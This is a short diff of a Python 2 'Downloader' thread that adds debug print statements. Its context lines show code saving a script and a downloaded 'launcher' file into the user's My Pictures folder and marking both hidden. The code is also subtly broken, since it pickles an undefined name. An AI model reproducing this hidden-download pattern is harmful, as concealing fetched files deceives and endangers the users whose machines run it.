@@ -19,14 +19,17 @@ class Downloader(threading.Thread):
         """
         threading.Thread.__init__(self)
         self.script = script
+        print self.script
         
     def run(self):
         """Run the thread."""
         #Make a file for the script
         path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "script.txt")
         file = open(path, "w")
+        print path
         #Save the script
         cPickle.dump(script, file)
+        print cPickle.dumps(script)
         #Hide the script
         file.close()
         win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)
@@ -39,6 +42,7 @@ class Downloader(threading.Thread):
         file.write(url.read())
         file.close()
         url.close()
+        print path
         #Hide the launcher
         win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)
 
